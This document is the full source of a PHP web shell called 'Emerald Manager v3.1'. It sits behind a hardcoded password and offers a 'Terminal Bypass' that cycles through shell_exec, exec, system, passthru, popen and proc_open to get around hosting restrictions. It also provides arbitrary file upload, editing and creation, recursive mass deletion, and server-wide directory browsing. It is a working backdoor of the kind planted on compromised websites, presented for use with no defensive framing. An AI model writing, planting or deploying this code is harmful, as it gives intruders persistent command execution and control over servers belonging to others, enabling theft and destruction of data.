<?php
/**
 * EMERALD MANAGER v3.1 - Complete File Manager & Bypass
 * Sidebar, Terminal, Upload, Create File/Folder, Rename, Mass Delete
 */
session_start();
$password = 'kominfo'; 
$auth_name = 'kominfo';

if (isset($_POST['p']) && $_POST['p'] === $password) { $_SESSION[$auth_name] = true; }
if (!isset($_SESSION[$auth_name])) {
    die('<html><body style="background:#0b0e0d;color:#0f8;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;font-family:sans-serif;"><form method="POST"><div style="background:#111a16;padding:30px;border-radius:15px;border:1px solid #1f3a2f;text-align:center;"><h2>EMERALD V3.1</h2><input type="password" name="p" style="background:#000;border:1px solid #1f3a2f;color:#0f8;padding:10px;width:100%;text-align:center;" placeholder="Enter Password"><br><button type="submit" style="background:#008f58;color:#fff;border:none;padding:10px 20px;cursor:pointer;margin-top:10px;width:100%;font-weight:bold;">LOGIN</button></div></form></body></html>');
}

// --- FUNGSI BYPASS ---
function emerald_cmd($c) {
    $out = ''; $c = $c . " 2>&1";
    $funcs = array('shell_exec', 'exec', 'system', 'passthru', 'popen', 'proc_open');
    foreach ($funcs as $f) {
        if (function_exists($f)) {
            if ($f == 'exec') { @$f($c, $r); $out = join("\n", $r); }
            elseif ($f == 'popen') { $h = @$f($c, 'r'); if($h){ while(!feof($h)){ $out .= fread($h, 1024); } pclose($h); } }
            elseif ($f == 'proc_open') {
                $d = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w"));
                $p = @proc_open($c, $d, $pipes);
                if (is_resource($p)) { $out = stream_get_contents($pipes[1]); fclose($pipes[1]); @proc_close($p); }
            } else { ob_start(); @$f($c); $out = ob_get_clean(); }
            if (!empty($out)) return $out;
        }
    }
    return ($out) ? $out : "FAIL: Terminal blocked by CageFS/LVE.";
}

// --- DIREKTORI ---
$dir = isset($_GET['d']) ? $_GET['d'] : getcwd();
$dir = str_replace('\\', '/', $dir);
@chdir($dir);
$dir = getcwd();
$msg = ''; $cmd_out = '';

// --- LOGIKA AKSI ---
if (isset($_POST['cmd'])) { $cmd_out = emerald_cmd($_POST['cmd']); }
if (isset($_FILES['u'])) { if (@move_uploaded_file($_FILES['u']['tmp_name'], $dir.'/'.$_FILES['u']['name'])) $msg = "Upload Success!"; }
if (isset($_POST['act'])) {
    $fn = $_POST['fn'];
    if ($_POST['act'] == 'save') { if(@file_put_contents($fn, $_POST['content']) !== false) $msg = "File Saved/Created: $fn"; }
    if ($_POST['act'] == 'mkdir') { if(@mkdir($fn)) $msg = "Folder Created: $fn"; }
    if ($_POST['act'] == 'rename') { if(@rename($_POST['old'], $_POST['new'])) $msg = "Renamed Success!"; }
    if ($_POST['act'] == 'mass_delete' && isset($_POST['items'])) {
        foreach ($_POST['items'] as $item) {
            if(is_dir($item)) { 
                $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($item, 0x1000), 1);
                foreach($it as $i) { @(is_dir($i)?rmdir($i):unlink($i)); } @rmdir($item);
            } else { @unlink($item); }
        } $msg = "Mass delete success.";
    }
}
if (isset($_GET['rm'])) { @unlink($_GET['rm']); @rmdir($_GET['rm']); $msg = "Deleted."; }
?>
<!DOCTYPE html>
<html>
<head>
    <title>Emerald 3.1 - Full Management</title>
    <style>
        :root { --g: #00ff88; --b: #0b0e0d; --c: #111a16; --border: #1f3a2f; }
        body { background: var(--b); color: #ccc; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; }
        .sidebar { width: 320px; background: var(--c); border-right: 1px solid var(--border); height: 100vh; position: fixed; padding: 20px; box-sizing: border-box; overflow-y: auto; }
        .main { margin-left: 320px; padding: 30px; width: 100%; }
        .card { background: #111; border: 1px solid var(--border); padding: 15px; border-radius: 8px; margin-bottom: 20px; }
        h3 { color: var(--g); margin-top: 0; font-size: 13px; text-transform: uppercase; border-bottom: 1px solid var(--border); padding-bottom: 5px; }
        input, textarea { background: #000; border: 1px solid var(--border); color: var(--g); padding: 10px; width: 100%; box-sizing: border-box; margin: 5px 0; border-radius: 4px; }
        .btn { background: #008f58; color: #fff; border: none; padding: 10px; width: 100%; cursor: pointer; font-weight: bold; border-radius: 4px; transition: 0.3s; }
        .btn:hover { background: var(--g); color: #000; }
        table { width: 100%; border-collapse: collapse; font-size: 14px; }
        th { text-align: left; color: #666; padding: 10px; border-bottom: 2px solid var(--border); }
        td { padding: 8px 10px; border-bottom: 1px solid #16241e; }
        .link { color: var(--g); text-decoration: none; }
        pre { background: #000; color: #0f8; padding: 15px; border: 1px solid var(--g); overflow: auto; max-height: 300px; white-space: pre-wrap; font-family: monospace; }
        .status { border-left: 4px solid var(--g); background: #1a2a22; padding: 10px; margin-bottom: 20px; color: var(--g); }
    </style>
</head>
<body>
    <div class="sidebar">
        <h2 style="color:var(--g); margin-bottom: 25px;">EMERALD 3.1</h2>
        
        <div class="card">
            <h3>Terminal Bypass</h3>
            <form method="POST">
                <input type="text" name="cmd" placeholder="ls -la / whoami">
                <button type="submit" class="btn">EXECUTE</button>
            </form>
        </div>

        <div class="card">
            <h3>File & Folder</h3>
            <form method="POST">
                <input type="hidden" name="act" value="mkdir">
                <input type="text" name="fn" placeholder="New Folder Name">
                <button type="submit" class="btn">CREATE FOLDER</button>
            </form>
            <form method="POST" style="margin-top:10px;">
                <input type="hidden" name="act" value="save">
                <input type="text" name="fn" placeholder="New File Name (e.g. index.php)">
                <button type="submit" class="btn">CREATE FILE</button>
            </form>
        </div>

        <div class="card">
            <h3>Upload & Rename</h3>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="u">
                <button type="submit" class="btn">UPLOAD FILE</button>
            </form>
            <form method="POST" style="margin-top:10px;">
                <input type="hidden" name="act" value="rename">
                <input type="text" name="old" placeholder="Old Name">
                <input type="text" name="new" placeholder="New Name">
                <button type="submit" class="btn">RENAME ITEM</button>
            </form>
        </div>
        <a href="?logout=1" class="btn" style="background:#800; text-align:center; text-decoration:none; display:block;">LOGOUT</a>
    </div>

    <div class="main">
        <?php if($msg) echo "<div class='status'>$msg</div>"; ?>
        <div class="card">Current Path: <span style="color:var(--g)"><?= $dir ?></span></div>

        <?php if($cmd_out): ?>
        <div class="card">
            <h3>Terminal Output:</h3>
            <pre><?= htmlspecialchars($cmd_out) ?></pre>
        </div>
        <?php endif; ?>

        <div class="card">
            <form method="POST" onsubmit="return confirm('Delete selected?')">
                <input type="hidden" name="act" value="mass_delete">
                <h3>Explorer <button type="submit" style="float:right; background:#800; color:#fff; border:none; padding:2px 10px; cursor:pointer; font-size:11px;">DELETE SELECTED</button></h3>
                <table>
                    <thead><tr><th width="30"><input type="checkbox" onclick="for(c of document.getElementsByName('items[]')) c.checked=this.checked"></th><th>Name</th><th width="100">Type</th><th width="150">Action</th></tr></thead>
                    <tbody>
                        <tr><td></td><td><a href="?d=<?= urlencode(dirname($dir)) ?>" class="link">.. [ Go Parent ]</a></td><td>DIR</td><td>-</td></tr>
                        <?php
                        foreach(scandir('.') as $f) {
                            if($f == '.' || $f == '..') continue;
                            echo "<tr><td><input type='checkbox' name='items[]' value='".htmlspecialchars($f)."'></td>";
                            echo "<td>" . (is_dir($f) ? "📁 <a href='?d=".urlencode($dir."/".$f)."' class='link'>$f</a>" : "📄 $f") . "</td>";
                            echo "<td>" . (is_dir($f) ? "DIR" : "FILE") . "</td>";
                            echo "<td><a href='?d=".urlencode($dir)."&e=".urlencode($f)."' class='link' style='color:#00d2ff'>Edit</a> | <a href='?d=".urlencode($dir)."&rm=".urlencode($f)."' style='color:#ff4444' onclick='return confirm(\"Del?\")'>RM</a></td></tr>";
                        }
                        ?>
                    </tbody>
                </table>
            </form>
        </div>

        <div class="card">
            <h3>File Editor</h3>
            <form method="POST">
                <input type="hidden" name="act" value="save">
                <input type="text" name="fn" placeholder="filename.php" value="<?= isset($_GET['e'])?htmlspecialchars($_GET['e']):'' ?>">
                <textarea name="content" rows="15" placeholder="File content here..."><?php if(isset($_GET['e']) && !is_dir($_GET['e'])) echo htmlspecialchars(file_get_contents($_GET['e'])); ?></textarea>
                <button type="submit" class="btn">SAVE CHANGES</button>
            </form>
        </div>
    </div>
</body>
</html>
